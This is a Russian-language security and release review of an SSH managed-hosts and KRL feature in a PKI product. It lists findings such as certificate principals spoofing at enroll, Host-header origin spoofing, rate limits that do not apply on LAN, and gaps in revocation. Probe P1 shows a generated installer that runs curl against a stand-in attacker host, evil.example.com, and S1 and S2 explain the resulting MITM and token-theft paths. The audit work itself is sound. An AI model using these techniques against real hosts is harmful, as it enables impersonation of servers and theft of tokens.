# Review: SSH Managed Hosts / KRL rollout — финальная сверка релиза

**Дата:** 2026-11-24
**Проверяемое состояние:** `feat/ssh-managed-hosts` @ `2c96a09a1` (загружен в `origin` тем же SHA)
**База сравнения:** `c0656da79` = тег `v2.254.4` → HEAD. Объём релиза: **56 коммитов, 71 файл, +10 196 / −56**
**Документы, с которыми сверялось:** `docs/SPEC_SSH_HOSTS_AND_KRL_AUTOMATION.md`, `frontend/src/DESIGN_SYSTEM.md`,
`docs/API_REFERENCE.md`, `docs/ADMIN_GUIDE.md`, `CHANGELOG.md`, `docs/PRE_RELEASE_CHECKLIST.md`,
`docs/REVIEW_SSH_HOSTS_AND_KRL_AUTOMATION.md` (раунды 1–7), `~/.config/opencode/AGENTS.md` (Lean Verification Standard)

Ревью независимое: код перечитан целиком, часть тезисов предыдущих раундов проверена заново живыми прогонами,
часть закрытых пунктов перепроверена на краевых условиях. Ниже — только то, что подтверждено чтением кода или прогоном.

---

## 0. Вердикт

**APPROVE WITH CONDITIONS.** Фича работает как заявлена (pull-контракт, guard rails, KRL/ETag, хост-сертификаты),
предыдущие BLOCKER (B1/B2) и почти все IMPORTANT закрыты и закреплены тестами. Но:

- **1 security BLOCKER** (S1) — агентский enroll принимает principals от вызывающей стороны;
- **9 IMPORTANT** (S2–S10) — трастовая граница origin установки, отключённые в LAN лимиты и отсутствие
  серверного каденс-гарда, расхождение «revoke host access» с ТЗ и дыра жизненного цикла сертификата, слепое пятно
  `Include` в sshd_config, недостоверный статус «KRL synced», недоступные в UI rotate/force-renew при обещании
  в CHANGELOG, UI видит только первые 25 хостов, правка `sshd_config` на Windows без валидации и без отката,
  незакрытый релиз (номер/тег/продуктовые руководства);
- **релиз формально не закрыт**: нет annotated-тега, CHANGELOG в `[Unreleased]`, продуктовые руководства
  (ADMIN_GUIDE / API_REFERENCE / USER_GUIDE) не описывают фичу вообще, номер `2.254.5-dev` конфликтует с
  уже выпущенным upstream-тегом `v2.254.5`.

---

## 1. Что проверено этим раундом (доказательства)

| Гейт | Команда | Результат |
|---|---|---|
| Backend, целевой набор SSH | `pytest tests/test_ssh_managed_hosts.py test_ssh_host_lifecycle_guards.py test_ssh_pull_only_contract.py test_ssh_krl_public.py test_ssh_agent_protocol_surface.py test_ssh_revoke_key_match_v7.py -q` | **125 passed**, 12.8 с. Побочно: 14 warning'ов `conftest.py:446` «left the shared tables changed» — подтверждённый долг тестовой обвязки (SSH-таблицы в `_LEAK_TABLES`, режим `warn`) |
| Frontend, целевой набор | `vitest run SSHHostsPage.pull-only SSHHostsPage.lifecycle ssh-hosts.service.payload designTokens opacityClasses` | **5 файла / 25 passed**, 3.8 с |
| Гейт маршрута | `vitest run src/components/__tests__/AppRoutes.sshHostsGate.test.jsx` | **3 passed** |
| i18n-парность | `node scripts/check-i18n-sync.js` | ✅ 9 локалей синхронны (uk: 5594 vs 5524 ключа — см. M4) |
| lint | `eslint` по 8 изменённым файлам | **0 errors, 14 warnings** (все — warnings, см. M8) |
| Дизайн-токены | `designTokens.test.js` + `opacityClasses.test.js` (сканируют всё `src/`) | ✅ ни одного undeclared-токена/-`-opNN` в новой странице |
| Права доступа | прогон viewer-роли на 6 админ-маршрутах хостов | **403 на всех** (`force-renew`, `rotate-token`, `revoke-cert`, `bootstrap`, `PATCH`, `DELETE`) |
|/csrf | `security/csrf.py:160-169` | агентские маршруты в exemption (токен, без сессии) — корректно; `/api/v2/ssh/hosts*` защищены токеном сессии |

Разовые пробы (временный файл, удалён; рабочее дерево чистое `git status` = 0):

| ID | Что проверялось | Факт |
|---|---|---|
| P1 | Отражение `Host`-заголовка в генерируемом инсталляторе | `Host: evil.example.com` → `UCM_URL="http://evil.example.com"` и `curl … "http://evil.example.com/ssh/agent-runner"` в скрипте, `200`. Метасимволы (`"`, `$`, backtick) Werkzeug вырезает → `UCM_URL="http:"` (скрипт битый, но **не** исполняемый). Shell-инъекции нет, подмена origin — есть |
| P2 | Scope bootstrap-токена | enroll принял principals `[host, sneaky-victim.lab.internal, gateway.lab.internal]` → `201`, сертификат выдан на все три имени |
| P3 | Валидация principals при регистрации | `POST /ssh/hosts` с hostname вне `allowed_principals` CA → `201`; падает только на самом хосте (`403 Principal … is not in the CA's allowed principals list`) |
| P4 | Каденс `/renew` | 6 подряд `/renew` живым токеном → `200 ×6`, **7 живых не отозванных host-сертификатов** одного хоста |
| P5 | Revoke (дефолт чекбокса выключен) → Delete | revoke → `cert_status: valid`; `DELETE /hosts/<id>` → `204`; строка сертификата осталась `revoked=False, status=valid`, `krl_version=0`, публичный KRL не содержит serial |
| P6 | Индексы | `bootstrap_hash` без индекса (уникальный только `token_hash`) → lookup на `/ssh/agent-setup` = скан таблицы |

---

## 2. Security BLOCKER

### S1. `POST /api/v2/ssh/hosts/enroll` принимает principals от вызывающей стороны → сертификат на чужое имя

`backend/api/v2/ssh/host_management.py:229-241` → `SSHManagedHostService.enroll` (`…/ssh_managed_host_service.py:144-163`):
список principals, присланный агентом, фильтруется только политикой principals CA (`signing.py:83-96`) и после этого
**фиксируется в хосте навсегда** (`host.get_principals()`, строки 149-150) и подписывается (`_sign_host_cert` → `valid_principals`).

Кто держит одноразовый bootstrap-токен (4 часа TTL, travelled в URL: `/ssh/agent-setup?token=…`, копируется оператором
в терминал, попадает в access-логи прокси), тот получает право подписать у Host CA сертификат **на любой набор имён,
проходящий по principals-политике CA**. Проверялось в P2: CA с `allow_any_principal` (и, что важнее, обычная
wildcard-политика вида `*.lab.internal`) → хост-сертификат, действительный для `sneaky-victim.lab.internal`.
Клиент, которому известен публичный ключ этого Host CA, примет такого сервера как `sneaky-victim` → MITM без компрометации самого victim-хоста.

Противоречие с ТЗ §3.3: токен «разрешает только вызовы `/renew` и `/check-in` для своего `host_id` и `host_ca_id`».
Усугубляет: ни UI (`SSHHostsPage` нигде не рисует `principals`, хотя `to_dict()` их отдаёт), ни аудит
(`AuditService` для enroll не вызывается вовсе; только `logger.info` и webhook-событие) не показывают,
на какие имена выдан сертификат. Оператор не узнает о подмене post-factum.

**Минимальная правка (3 строки):** в `agent_enroll` убрать приём `principals` (агент их и не шлёт: POSIX-раннер
`ucm_agent_scripts.py:268-271` передаёт только `bootstrap_token/hostname/public_key`, PowerShell — то же),
принципал = `hostname`. Если алиасы хостов нужны по-настоящему — тогда principals принимает **админ** при
регистрации (`create_host`), enroll их не расширяет, а UI и аудит их показывают. Тест `test_ssh_managed_hosts.py`
уже покрывает отказ по политике CA — он не покроет эту правку, нужен отдельный ассерт «присланный principals игнорируется».

---

## 3. IMPORTANT

### S2. Origin установки берётся из `request.url_root`, а не из канонического admin-origin продукта
`api/ssh_setup.py:157`, `api/v2/ssh/host_management.py:118` и `:135`. Весь остальной продукт строит URL, которые
уходят наружу, через `utils.public_endpoints.get_admin_canonical_origin()` (`api/v2/auth.py:194`,
`api/v2/sso/saml_sp.py:44`, `services/policy_notifications.py:296`, `public_endpoints.py:777`).

Следствия (P1 подтвердил):
1. Хост, которому поставили команду, скопированную из UI, открытого по чужому имени/IP (или через прокси,
   пробрасывающий `Host`), скачивает runner **с чужого сервера** и выполняется против него с root-правами
   (`curl … | sudo bash`): злоумышленник подаёт свой `/ssh/agent-runner`, забирает host-токен и подписывает
   «свой» host-сертификат. Канонический redirect смягчает это только когда `base_url` настроен; на свежей
   установке/доступе по IP — нет.
2.ProxyFix выключен по умолчанию (`app.py:183-198`, `UCM_BEHIND_PROXY`), поэтому за nginx с TLS-on-front
   `request.url_root` = `http://…` → инсталлятор генерирует `UCM_URL="http://…"`, агент работает открытым
   текстом (сам инсталлер честно печатает WARN, строки 438-442, но фича «из коробки» получается небезопасной).
3. Мусорный `Host` даёт `UCM_URL="http:"` — конфигурация агента битая, UI при этом показывает «Host registered».

**Правка:** один источник origin — `get_admin_canonical_origin()` (fallback на `request.url_root` только если
канонический не настроен), прогон через `parse_public_url()` до вставки в скрипт и отказ/400, если origin
не прошёл валидацию. Пункт уже записан долгом в раунде 4 («base_url = origin админ-запроса … вместо канонического») —
он остаётся открытым и он же является нарушением внутрипродуктовой практики.

### S3. Все лимиты на агентских маршрутах де-факто выключены, серверных каденс-гардов нет
`app.py:43-72` снимает flask-limiter для RFC1918/loopback/link-local при `RATE_LIMIT_TRUST_LAN` (default **true**);
то же делает `security/rate_limiter.py:256-264`. Декораторы `_limit('10 per minute')` / `'60 per minute'`
(`host_management.py:219, 270, 291`) в типичной LAN-развёртке UCM **не действуют никогда** — а.managed hosts
живут именно в LAN. Проверено P4: 6/6 успешных `/renew` без какого-либо порога.

Итог: из LAN (или с любого скомпрометированного managed host) можно (а) перебирать bootstrap/host-токены
без ограничения частоты, (б) бесконечно перевыпускать сертификаты: 10/мин теоретически → ~14 400 строк
`ssh_certificates` + 2 webhook-события на хост в сутки. `renew_threshold_percent` на сервере не проверяется
(осознанно, комментарий `ssh_managed_host_service.py:227-228`), вытесненные сертификаты не отзываются и не удаляются.

**Правка (по хозяйски, keyed by host, а не by IP):** в `renew()` отказывать, если `cert_status()` не в
`('expiring','expired')` (то есть порог CA всё-таки исполняется сервером); в enroll не полагаться на IP-лимит:
счётчик попыток на `host_id`. Это же закрывает раздувание таблицы и webhook-очередей.

### S4. «Revoke host access» по дефолту не отзывает сертификат — противоречие ТЗ и дыра жизненного цикла
`host_management.py:174` (`revoke_certificate` default `False`), `ssh_managed_host_service.py:324-348`,
UI-чекбокс `SSHHostsPage.jsx:749-770` (дефолт выключен, commit `13bf59515`).
ТЗ §3.5 п.2 требует: «Действующий сертификат хоста отправляется в KRL Host CA». SPEC с тех пор не изменена →
**продуктовая документация описывает одно поведение, код делает другое**, и это не зафиксировано как решение,
а как фича интерфейса.

Практический след подтверждён прогоном P5: оператор жмёт «Revoke host access» (текст модального окна обещает
остановку продлений), хост становится `revoked`, сертификат остаётся `valid`; после этого `Delete Host`
разрешён (`delete_host`, строки 351-363, блокирует только `auto_renew AND cert valid`) → `204`, строка хоста
исчезает, а сертификат живёт до `valid_to` (по умолчанию 30 суток), Host CA `krl_version = 0`, публичный KRL
его не содержит. У ушедшего хоста нет ни строки в UI, где можно было бы отозвать остаток: он виден только
в `/ssh/certificates` (это и есть единственная смягчающая мера).

**Правка:** либо вернуть дефолт `revoke_certificate=True` (как в ТЗ) и оставить чекбокс как opt-out, либо
— если осознанное продуктовое решение «сначала отрезать агента, сертификат доживает» — тогда (1) переписать
ТЗ §3.5, (2) запретить `Delete Host`, пока у хоста есть не отозванный живой сертификат (не только при
`auto_renew=True`), (3) в тексте модалки показать срок, до которого сертификат остаётся действительным.

### S5. Агент не видит директив sshd в `Include` — B2 возвращается в узкой форме
`ucm_agent_scripts.py:98-129`: `directive_value()` / `directive_target()` / `ensure_directive()` читают только
`$SSHD_CONFIG`. `validate_sshd()` (строки 78-85) при этом делает `sshd -t -C "include $SSHD_CONFIG"`, то есть
guard understands includes, а разрешение пути — нет. Если `RevokedKeys` / `TrustedUserCAKeys` / `HostCertificate`
объявлены в дроп-ине (`/etc/ssh/sshd_config.d/*.conf`), агент (а) не найдёт существующее значение и (б) допишет
свою строку в основной файл. OpenSSH берёт **первое** значение директивы, а Include обрабатывается по позиции в
файле — то есть значение из дропина выигрывает. KRL пишется в `/etc/ssh/ucm_user_krl`, sshd читает другой путь,
отзывы пользователей не применяются, а UI показывает «KRL last synced: только что». Это ровно механизм B2,
закрытый в раунде 1 и не закрытый для `Include`.

**Правка:** если `sshd -T` доступен, читать эффективные значения директив из него (`sshd -T | sed -n 's/^\(revokedkeys\|trustedusercakeys\|hostcertificate\) //p'`),
grep по `$SSHD_CONFIG` оставить fallback'ом. Один хелпер вместо трёх grep'ов.

### S6. Колонка «KRL last synced» подтверждает обращение агента, а не запись KRL
`ssh_managed_host_service.check_in` (`…:265-300`) ставит `last_krl_sync_at = utc_now()` при любом успешном
`POST /check-in`. POSIX-агент (`ucm_agent_scripts.py:330-340`) вызывает check-in и отдельно пишет KRL; при отказе
записи он печатает `WARN: could not write the KRL to …` и всё равно делает check-in. Windows-агент (`Fetch-KRL`,
строки 501-530) при `304` возвращает `$false` — check-in тоже происходит.

Итог: UI показывает «KRL synced: 2 minutes ago» на хосте, который не может положить файл в путь, который реально
читает sshd (типично вместе с S5). Для PKI-продукта это статус, на который оператор опирается при аудоте отзывов.

**Правка:** агент уже знает результат — пусть передаёт его в теле check-in (`krl_written: true|false|unchanged`,
`krl_error`), сервер пишет `last_krl_sync_at` только когда `krl_written` истинно, а UI рисует предупреждающий бейдж
при `krl_error`. Одновременно это даёт наблюдаемость для S5 без нового опроса хостов (pull-модель не нарушается).

### S7. Заявленные в CHANGELOG «host-token rotation, force renew» недоступны в UI
`CHANGELOG.md:14` описывает их как «Admin controls». В UI их нет: `sshHostsService.rotateToken` и `forceRenew`
(`ssh-hosts.service.js:65-72`) не вызывает ни один компонент (только тесты сервиса), ключи переводов
`rotateToken / rotateConfirm / hostTokenOnce / hostTokenOnceHint / forceRenew / forceRenewDone` — мёртвые
(см. M4). Маршруты `POST /api/v2/ssh/hosts/<id>/rotate-token` и `/force-renew` работают (проверено: viewer → 403,
admin → доступен), но оператору UI предлагает только «Revoke host access» и «Delete».

Следствие по продукту: единственный доступный способ перевыпустить сертификат «сейчас» — revoke c последующим
реинсталлом агента (новый bootstrap-токен, новая команда установки на хосте). Для PKI-оператора это ровно тот
сценарий, ради которого «force renew» и был задуман.

**Правка:** либо добавить два действия в меню строки (меню уже есть, ConfirmModal уже есть — 15 строк JSX),
либо убрать формулировку из CHANGELOG и SPEC. Первое предпочтительнее: бэкенд и тесты готовы.

### S8. Страница видит только первые 25 хостов — KPI и поиск недостоверны выше этого порога
`SSHHostsPage.jsx` вызывает `sshHostsService.getAll()` **без параметров** → серверный дефолт `per_page=25`
(`utils/pagination.py:parse_request_pagination`); серверные `search`/`page`/`meta.total` не используются,
поиск делает `ResponsiveDataTable` клиентски (`searchable` + `searchKeys`) по этим 25 строкам, а карточки
`statsTotal / statsOnline / statsExpiring / statsRevoked` считаются по `hosts.length`.

Проверено косвенно: `GET /api/v2/ssh/hosts?search=<имя>&per_page=100` находит хост, которого нет в
`GET /api/v2/ssh/hosts` по умолчанию (все пробы P2–P5 искали именно так). При 26+ хостах таблица молча
недостоверна, а «Total hosts» показывает 25.

**Правка:** либо `getAll({ per_page: 100 })` + серверный поиск (метод сервиса уже принимает параметры) с
индикацией `meta.total`, либо пагинация в таблице. Меньший вариант — первая строка; второй правильнее для флитов.

### S9. Windows-ветка агента меняет sshd_config без валидации и без отката
`ucm_agent_scripts.py:466,479-492`: PowerShell-раннер дописывает директиву в `sshd_config` (бэкап `.ucmbak` делает)
и затем `Reload-SSH` = `Restart-Service sshd -ErrorAction SilentlyContinue`. В POSIX-ветке есть
`apply_sshd_guard` → `validate_sshd` (`sshd -t`) → откат бэкапа при неудаче (строки 78-85, 201-213); в Windows-ветке
ни валидации, ни восстановления бэкапа, ни проверки, что служба поднялась. Ошибка сервиса глушится
`-ErrorAction SilentlyContinue`, вывод раннера уходит в Scheduled Task и никто его не читает; UCM при этом
фиксирует хост как `online`.

Риск: битая директива (например путь с пробелом — `Resolve-Target` берёт значение как есть) снимает SSH на хосте,
а оператор видит «Agent: online» и «KRL synced». Это единственный путь потери доступа к хосту во всём релизе.

**Правка:** после `Ensure-Directive` выполнять `sshd.exe -t` (или `Get-Content $cfgFile | Select-String -NotMatch`
проверку синтаксиса минимально) и при неудаче восстановить `.ucmbak` и не перезапускать службу; либо вообще
не редактировать конфиг на Windows, а требовать ручной настройки (тогда убрать Windows-опцию из UI-шагов
установки). Первое — ~10 строк.

### S10. Релиз формально не закрыт: версия, тег и продуктовые документы
- `VERSION = 2.254.5-dev`, `CHANGELOG.md` — секция `[Unreleased]`; annotated-тега на `2c96a09a1` нет
  (`git tag --points-at HEAD` пусто), ветка запушена в `origin` тем же SHA, PR/merge в `upstream/v2.x` нет.
- Номер конфликтует с реальностью: теги `v2.254.5`, `v2.254.6` уже выпущены (18–19 ноя) и живут в `upstream/v2.x`;
  `HEAD` не является предком ни одного из них. Релиз этой ветки обязан получить **2.254.7** (или 3.0.0 по решению
  мейнтейнера), иначе следующий `release()` задвоит номер.
- Продуктовая документация молчит: в `docs/ADMIN_GUIDE.md`, `docs/API_REFERENCE.md`, `docs/USER_GUIDE.md`,
  `README.md` нет ни одного упоминания `Managed hosts`, `/api/v2/ssh/hosts`, `/ssh/agent-setup`,
  `/ssh/agent-runner`, `/ssh/krl/<refid>`, `ucm-ssh-agent`, `host_cert_ttl`, `renew_threshold_percent`.
  Для фичи, которая ставит на сервер root-скрипт и подписывает host-сертификаты, это блокирует и внедрение,
  и аудит. `docs/README.md` не индексирует ни SPEC, ни REVIEW, ни CHECKLIST.

**Правка:** раздел в ADMIN_GUIDE (что делает агент, какие файлы и директивы он правит, как удалить агента),
раздел API_REFERENCE (полные контракты `/api/v2/ssh/hosts*` + агентские маршруты + `/ssh/krl/<refid>`),
и `docs/README.md`-индекс. Это же закрывает требование «документация продукта = источник истины».

---

## 4. IMPORTANT (сводный список S2–S10)

| ID | Область | Суть | Минимальная правка |
|---|---|---|---|
| S2 | Безопасность / практика продукта | Origin установки из `request.url_root`, а не из канонического admin-origin | `get_admin_canonical_origin()` + валидация через `parse_public_url()` |
| S3 | Безопасность | Лимиты на агентских маршрутах не работают в LAN; сервер не исполняет `renew_threshold_percent` | кадeнс-гард в `renew()` + счётчик попыток enroll по `host_id` |
| S4 | Продукт / ТЗ | «Revoke host access» по дефолту не отзывает сертификат; удалённый хост оставляет живой сертификат вне KRL | дефолт `revoke_certificate=True` **или** правка SPEC + запрет Delete при живом сертификате |
| S5 | Безопасность / агент | `Include` в sshd_config: агент пишет директиву не туда, sshd берёт значение из дропина | читать эффективные значения из `sshd -T` |
| S6 | Правдивость статуса | `last_krl_sync_at` ставится независимо от записи KRL агентом | агент передаёт `krl_written` / `krl_error` |
| S7 | Продукт | rotate-token и force-renew обещаны в CHANGELOG, в UI их нет | 2 пункта меню + ConfirmModal (бэкенд готов) |
| S8 | UI / корректность | Страница берёт 25 строк, KPI и поиск считаются по ним | `getAll({per_page:100})` + серверный поиск, либо пагинация |
| S9 | Безопасность / эксплуатация | Windows: правка `sshd_config` без `sshd -t`, без отката бэкапа, ошибка сервиса глушится | валидация + откат, либо отказ от автоправки на Windows |
| S10 | Релиз-гигиена | Нет тега, версия `2.254.5-dev` конфликтует с выпущенными `v2.254.5/v2.254.6`, продуктовые руководства не описывают фичу | версия 2.254.7 + тег + разделы ADMIN_GUIDE / API_REFERENCE + индекс docs/README |

---

## 5. MINOR

| ID | Где | Находка |
|---|---|---|
| M1 | `host_management.py` | Отказы агентской аутентификации (`Invalid or expired bootstrap token`, `Invalid host token`, principals-policy) идут только в `logger.warning`. `AuditService` не пишется ни на одной агентской операции — перебор токенов невидим в журнале аудита, в аудите живут только админ-действия. Для PKI-продукта это пробел наблюдаемости (в СЭЗ/Compliance-отчётах фича не появится). |
| M2 | `models/ssh.py`, миграция 138 | `bootstrap_hash` и `token_hash` без индексов (`token_hash` только unique-ограничение, `bootstrap_hash` вообще без него): `/ssh/agent-setup?token=…` = полный скан `ssh_managed_hosts` на каждый запрос; на флите из тысяч хостов это ещё и timing-oracle по токену. Проверено: список индексированных колонок = `hostname, host_ca_id, user_ca_id, status`. |
| M3 | `public_endpoints.py:48-76`, `app.py:1053-1062` | Агентские маршруты в `PROTOCOL_EXACT_PATHS` → исключены из http→https-апгрейда и из admin-allowlist. host-токен и выданный host-сертификат идут открытым текстом, когда `UCM_URL=http://…` (дефолт при ProxyFix-выключенном стеке, S2 п.2). Инсталлер честно печатает WARN, но «из коробки» получается cleartext. |
| M4 | i18n, 9 локалей | `sshHosts.neverSeen` используется (`SSHHostsPage.jsx:535, 624`) и **отсутствует** во всех локалях → в UI рендерится литерал `sshHosts.neverSeen`. 25 из 105 ключей секции мёртвые (список выше) × 9 локалей = 225 лишних строк. В uk `sshHosts.subtitle_few` и `subtitle_many` — untranslated английский текст («Managed servers pull their KRL … ({{count}} registered)») рядом с корректным `subtitle_one/other`. Заполненность перевода секции наихудшая в приложении: de/it/pt 72/105, es/fr/ja/zh 71/105 строк совпадают с EN дословно (при общем baseline 4.7–7.7%), uk 45/105. Внутри одной локали противоречие терминов: `sshHosts.certValid = "Valid"` против `sshCertificates.statusValid = "Gültig"`, и `common.revoked = "Widerrufen"` рядом с `sshHosts.certRevoked = "Revoked"`. `check-i18n-sync.js` это не ловит: он считает парность ключей, а не качество перевода. |
| M5 | `SSHHostsPage.jsx:77` | Жёсткая английская строка `4 hours TTL` в карточке «Host not connected» — единственная не-i18n строка страницы; там же она неверна по смыслу: TTL 4 часа у bootstrap-токена, не у хоста. |
| M6 | `crud.py:239-242`, `ssh_ca_service.py:319-333` | `host_cert_ttl` и `renew_threshold_percent` валидируются и сохраняются (1..90), но в UI SSH CA их нет (grep по `frontend/src` = 0 совпадений). Оператор не может ни прочитать, ни изменить TTL host-сертификатов — практически он зафиксирован 30 сутками; из S4 это делает «живой сертификат удалённого хоста» месячным окном. |
| M7 | `docs/PRE_RELEASE_CHECKLIST.md` | Новый файл на 438 строк ручных шагов создан этим релизом. Прямое противоречие Lean Verification Standard (`~/.config/opencode/AGENTS.md` §4: «No 40-item manual checklists (`PRE_RELEASE_CHECKLIST.md`)»). Ручные прогоны нужны были автору тестов (разделы 1–8 доказаны конкретными curl-выводами), но как вечный артефакт они запрещены. Решение: перенести повторяемое в `scripts/` (стенд из §0b уже почти скрипт), §9 «Defect register» перенести в этот REVIEW-документ, файл удалить. |
| M8 | lint | `eslint` по 8 изменённым файлам: 0 errors, 14 warnings. Существенные: `ResponsiveDataTable.jsx:341` — `useCallback` без `setSearchValue` в зависимостях (реальный риск устаревшего замыкания в поиске), `ToggleSwitch.jsx:15` — неиспользуемый `props`. Остальные — в чужом для этого релиза коде компонента. |
| M9 | `SSHHostsPage.jsx` (модалка Restart sshd) | Текст «takes a few seconds, existing connections are not dropped» подаётся как факт, но агент применяет `systemctl reload sshd \|\| reload ssh \|\| service ssh reload` с `2>/dev/null \|\| true` — при отсутствии всех трёх (container, some BSDs) конфиг перезаписан, sshd не перечитан, и UI не знает об этом (тот же корень, что S6). |

---

## 6. NOTE (не дефекты; зафиксированные ограничения и долг)

- **N1** `SSHKRLService.generate_krl` собирает в Python-список все revoked-сертификаты CA и пишет `serial: N`
  (текстовый OpenSSH KRL) при каждом изменении `krl_version`; `get_cached_krl` кэширует на процесс по `ca.id`.
  При CA с десятками тысяч отзывов это пик памяти в worker'е и сериализация под lock'ом. Приемлемо для текущего
  масштаба; порог — измерить на реальном флите.
- **N2** `conftest.py:446` поднимает 14 warning'ов «left the shared tables changed: ssh_cas +14, ssh_certificates +12,
  ssh_managed_hosts +7» на каждом SSH-файле теста. Это известный долг тестовой обвязки (`_LEAK_TABLES`, режим warn),
  а не дефект фичи; но он мешает считать тестовый набор «чистым».
- **N3** Pull-модель (запрет push, #451) означает: гарантированная свежесть KRL = 15 минут, и UCM никогда не узнает,
  что агент умер. Это осознанное решение мейнтейнера, зафиксированное в SPEC и в `docs/PRE_RELEASE_CHECKLIST.md` §10;
  UI честно показывает «Agent: never seen» для таких случаев. Претензий нет.
- **N4** `principals` хоста нигде не показываются в UI, хотя `to_dict()` их отдаёт. Само по себе это NOTE,
  но именно оно делает S1 невидимым для оператора — исправлять лучше вместе с S1.

---

## 7. Соответствие ТЗ (`docs/SPEC_SSH_HOSTS_AND_KRL_AUTOMATION.md`) и внутренней документации

| Требование ТЗ | Реализация | Вердикт |
|---|---|---|
| §3.1 Регистрация хоста → одноразовый bootstrap-токен | `create_host` + `bootstrap_hash`, TTL 4 ч, one-time (снимается после enroll) | ✅ закрыто, закреплено тестами |
| §3.2 Один command-line для установки агента | `install_command` (`curl -sSL … \| sudo bash`), POSIX + Windows installer | ✅ работает; ⚠ origin строится из `request.url_root` (S2) |
| §3.3 Токен разрешает только `/renew` и `/check-in` для своего `host_id`/`host_ca_id` | renew/check-in действительно ограничены host_id | ❌ **нарушено**: enroll принимает principals от вызывающей стороны (S1) |
| §3.4 Автоматическое продление по `renew_threshold_percent` CA | Агент считает порог сам; сервер не проверяет | ⚠ односторонне (S3) |
| §3.5 п.1 «Revoke Host Access → токены обнулены, auto_renew off» | `revoke_host` делает ровно это | ✅ |
| §3.5 п.2 «Действующий сертификат хоста отправляется в KRL Host CA» | `revoke_certificate` по умолчанию `False` (UI-чекбокс) | ❌ **расхождение доков и кода** (S4) |
| §3.5 п.3 «Delete заблокирован, пока хост не отозван» | Блокировка по `auto_renew AND cert valid` | ⚠ формально выполнено, но даёт дыру из S4 |
| §4 KRL: публичный `GET /ssh/krl/<refid>`, ETag/304, генерация один раз на отзыв | `ssh_krl_service` + `ssh_setup.py`, ETag по `krl_version` | ✅ проверено прогоном (125 тестов, включая `test_ssh_krl_public.py`) |
| §5 Guard rails sshd_config (не трогать чужие значения, откат при битом конфиге) | POSIX: `directive_value`/`ensure_directive`/`apply_sshd_guard` + `sshd -t` + backup | ✅ для POSIX; ❌ для `Include` (S5) и для Windows (S9) |
| §6.1 UI: колонки hostname / host CA / cert / auto-renew / user CA / agent | `SSHHostsPage.jsx` | ✅ колонки есть; ⚠ только первые 25 строк (S8) |
| §6.1 UI: rotate token / force renew как действия админа | Только API | ❌ (S7) |
| §7 Webhook-события жизненного цикла | `ssh_host.enrolled/renewed/revoked`, `ssh_certificate.issued/revoked`, `ssh_ca.krl_updated` | ✅ (`webhook_service.py`) |
| «Pull-only: UCM никогда не обращается к хостам» | Нет wake-up POST, нет long-poll; тест `SSHHostsPage.pull-only.test.jsx` сторожит лексику | ✅ сильно: закреплено тестом на исходник страницы |

**Вывод по разделу:** ТЗ соблюдено по архитектуре и по агентской модели; два прямых расхождения — §3.3 (S1) и §3.5 п.2
(S4), плюс один пункт (S7) заявлен в CHANGELOG, но не собран. Все три — правки объёмом до 20 строк каждая.

---

## 8. Дизайн-система и UI/UX (`frontend/src/DESIGN_SYSTEM.md`)

**Соответствует** (проверено гейтами, а не мнением):
- `designTokens.test.js` и `opacityClasses.test.js` (сканируют весь `src/`) зелёные → ни одного undeclared-токена
  и ни одной `-opNN`-классы без объявления в `index.css`; последний коммит релиза (`2c96a09a1`) как раз чинит
  неканонический `bg-bg-secondary` → канонический токен.
- Композиция страницы — штатная для продукта: `ResponsiveLayout` + `ResponsiveDataTable` + `ConfirmModal` +
  `ToggleSwitch`, никаких самописных таблиц, карточек и inline-стилей; `autoIcon`-значения (`hostCa`, `userCa`,
  `autoRenew`, `lastSeen`) берутся из `FIELD_ICONS` в `DetailCard.jsx` (значит иконки не выдуманы страницей).
  Замечание: `hostCa` / `userCa` / `autoRenew` / `lastSeen` **не** входят в `FIELD_ICONS` → `autoIcon` рендерит
  дефолтную иконку. Работает, но смысл колонок визуально не различается; либо добавить ключи в `FIELD_ICONS`,
  либо убрать `autoIcon` с этих четырёх колонок.
- Кнопки — через `Button`/варианты,destructive-действия ведут себя как везде (ConfirmModal), латунь «Restart sshd»
  отдельно от revoke/delete.

**Отклонения от дизайн-системы и устоявшихся практик продукта:**

| # | Что | Почему это отклонение |
|---|---|---|
| D-a | Жёсткая строка `4 hours TTL` | В приложении нет ни одной не-i18n видимой строки, кроме этой (M5) |
| D-b | `sshHosts.neverSeen` отсутствует в локалях | Рендерится ключ вместо текста — то, что `check-i18n-sync.js` не умеет ловить, а `DESIGN_SYSTEM.md` требует |
| D-c | Терминология секции не совпадает с соседними SSH-страницами | В той же локали: `sshCertificates.statusValid = "Gültig"`, а новая страница — `Valid`; `common.revoked = "Widerrufen"` рядом с `certRevoked = "Revoked"` (M4) |
| D-e | Поиск и KPI на 25 строках | Во всех остальных списках продукта поиск серверный и KPI считаются по `meta.total` (S8) |
| D-f | Мёртвые ключи и 68% untranslated | Секция наихудшая по локализации в приложении (M4) |
| D-g | Нет rotate-token / force-renew в меню строки | Действия бэкенда есть, UI их не показывает; в остальных страницах продукта действие доступно в меню строки (S7) |
| D-h | `autoIcon` для `hostCa`/`userCa`/`autoRenew`/`lastSeen` вне `FIELD_ICONS` | Колонки различаются только текстом заголовка |

Эстетически страница не выглядит инородной: она собрана из тех же примитивов, что SSH CA и SSH Certificates.
Претензии — к правдивости чисел и к переводу, не к вёрстке.

---

## 9. Безопасность — отдельная детальная проверка

### 9.1 Что держится крепко (подтверждено прогонами и чтением)

| Контроль | Доказательство |
|---|---|
| Разделение ролей: viewer не может ничего изменить | Прогон viewer-роли по 6 админ-маршрутам хостов → `403` на всех (`force-renew`, `rotate-token`, `revoke-cert`, `bootstrap`, `PATCH`, `DELETE`) |
| Bootstrap-токен: одноразовый, TTL 4 ч, хранится хэшем | `SSHManagedHost.bootstrap_hash` + `bootstrap_expires`; повторный enroll → 4xx; тесты `test_ssh_managed_hosts.py` |
| Host-токен: хранится хэшем, выдаётся один раз, привязан к host_id | `token_hash` / `token_prefix`; renew принимает только свой токен (тесты `test_ssh_host_lifecycle_guards.py`) |
| Агентские маршруты не требуют CSRF-токена сессии, и это правильно | `security/csrf.py` (exemption для token-auth маршрутов); админ-маршруты защищены сессионным CSRF как обычно |
| Классификация агентских маршрутов и отдельные бакеты лимитов | `public_endpoints.py:48-76` + `rate_limiter.py:139-152`; тест `test_ssh_agent_protocol_surface.py` закрепляет контракт |
| KRL — публичные данные, без аутентификации, ETag/304 | `test_ssh_krl_public.py` (125 passed в наборе) |
| Права файлов агента | `umask 077` в инсталлере, `0600` на `/etc/ucm/ucm-ssh-agent.conf` и на ключевые файлы, атомарная запись через `atomic_file` с cleanup осиротевших `.tmp.<pid>` |
